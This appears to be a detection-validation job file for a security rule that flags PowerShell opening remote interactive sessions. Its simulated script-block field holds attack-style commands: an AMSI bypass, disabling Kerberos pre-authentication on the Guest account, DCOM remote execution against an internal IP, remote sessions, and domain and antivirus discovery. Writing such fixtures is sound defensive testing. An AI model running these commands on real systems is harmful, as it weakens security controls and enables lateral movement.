type: job
name: Interactive Session on Remote Endpoint with PowerShell
detection:
  source: escu
  name: "ESCU - Interactive Session on Remote Endpoint with PowerShell - Rule"
  id: a4e8f3a4-48b2-11ec-bcfc-3e22fbd008af
description: |
  Validates detection of PowerShell opening an interactive session on a
  remote computer: PowerShell/Operational EID 4104 (Script Block Logging)
  records a block read from a script file that calls Enter-PSSession
  -ComputerName with a remote computer name, among a series of account,
  domain and security-product discovery commands.

mitre:
  tactics: [lateral-movement]
  techniques: [T1021.006]

state:
  domain_short:       CORP
  domain_tld:         local
  domain_short_lower: fn.lower(ref.domain_short)
  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
  computer:           gen.hostname(class=windows-server, domain=ref.domain_fqdn)
  level:              3

workloads:
  - scenario: scenarios/windows/powershell/script-block/script-block-logged
    bindings:
      domain_short:      ref.domain_short
      domain_tld:        ref.domain_tld
      computer:          ref.computer
      level:             ref.level
      provider_guid:     "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
      script_path:       "C:\\Temp\\simulate.ps1"
      script_block_text: "Get-LocalUser | Out-File -FilePath .\\localUser.txt; Get-ADUserResultantPasswordPolicy -Identity Administrator | Out-File -FilePath .\\PasswordPolicy.txt; Get-ADuser Guest | Set-ADAccountControl -DoesNotRequirePreAuth:$true; Get-ADDefaultDomainPasswordPolicy | Out-File -FilePath .\\ADDefaultPassPolicy.txt;Enter-PSSession -ComputerName ar-win-dc-default-attack-range;[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt;$env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append;[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt;get-wmiobject win32_group | Out-File -FilePath .\\DomainGroup.txt;$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\")); $item = $o.Item() ; $item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0);[activator]::CreateInstance([type]::GetTypeFromCLSID(\"C08AFD90-F2A1-11D1-8455-00A0C91F3880\",\"10.0.1.16\")).Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0); Get-AdComputer -Filter * | Out-File -FilePath .\\AdComputer.txt;[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);Invoke-Command -ComputerName ar-win-dc-default-attack-range -ScriptBlock {ipconfig};Get-WmiObject -Query â€œSELECT * FROM AntiSpywareProductâ€\x9d;Get-WmiObject -Query â€œSELECT * FROM AntiVirusProductâ€\x9d;get-wmiobject Win32_ComputerSystemProduct"
    expectation:
      expected: alert
      summary: "PowerShell runs Enter-PSSession -ComputerName among other discovery commands"
      mitre:
        tactics: [lateral-movement]
        techniques: [T1021.006]
